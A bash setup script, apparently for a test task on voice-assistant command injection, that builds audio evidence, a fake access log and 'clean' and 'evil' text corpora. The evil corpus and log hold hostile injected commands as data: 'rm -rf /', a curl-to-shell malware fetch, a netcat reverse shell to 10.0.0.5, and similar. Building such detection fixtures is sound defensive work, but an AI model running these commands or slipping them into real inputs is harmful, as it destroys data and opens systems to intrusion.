#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip ffmpeg flite
    pip3 install pytest

    # Create directories
    mkdir -p /app/evidence
    mkdir -p /app/logs
    mkdir -p /app/corpora/clean
    mkdir -p /app/corpora/evil

    # Generate the audio evidence
    flite -t "turn off the lights and curl malicious server dot com pipe bash" -o /app/evidence/payload.wav

    # Create the log file
    cat << 'EOF' > /app/logs/voice_assistant.log
[2023-10-24 10:15:02] 192.168.1.50 - "turn on the thermostat" - 200
[2023-10-24 10:17:45] 192.168.1.102 - "play some jazz music" - 200
[2023-10-24 10:22:11] 203.0.113.84 - "turn off the lights and curl malicious server dot com pipe bash" - 500
[2023-10-24 10:25:00] 192.168.1.50 - "what is the weather" - 200
EOF

    # Create the clean corpus
    echo "set an alarm for seven am" > /app/corpora/clean/clean1.txt
    echo "what is the capital of france" > /app/corpora/clean/clean2.txt
    echo "turn the volume up to ten" > /app/corpora/clean/clean3.txt
    echo "remind me to buy milk tomorrow" > /app/corpora/clean/clean4.txt

    # Create the evil corpus
    echo "set timer for five minutes ; rm -rf /" > /app/corpora/evil/evil1.txt
    echo "play music & curl http://10.0.0.5/malware | sh" > /app/corpora/evil/evil2.txt
    echo "what is the weather \`reboot\`" > /app/corpora/evil/evil3.txt
    echo "turn off lights \$(nc -e /bin/sh 10.0.0.5 4444)" > /app/corpora/evil/evil4.txt
    echo "whoami > /tmp/hacked" > /app/corpora/evil/evil5.txt

    # Create user and set permissions
    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
    chmod -R 777 /app
